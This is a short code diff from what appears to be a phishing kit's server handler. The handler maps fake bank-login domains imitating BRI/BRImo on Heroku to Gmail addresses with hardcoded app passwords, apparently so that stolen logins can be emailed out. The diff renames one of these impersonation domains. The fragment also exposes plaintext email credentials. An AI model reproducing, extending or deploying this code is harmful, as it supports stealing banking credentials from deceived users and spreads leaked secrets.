@@ -27,7 +27,7 @@ export default function handler(req, res) {
         pass = 'rtzqphftdjkdrnwa';
         
     }
-    else if (url == 'log-in-brimo.herokuapp.com'){
+    else if (url == 'log-in-bri.herokuapp.com'){
         email = 'nilabakar403@gmail.com';
         pass = 'hpwgbnwdgdpryjpa';
         
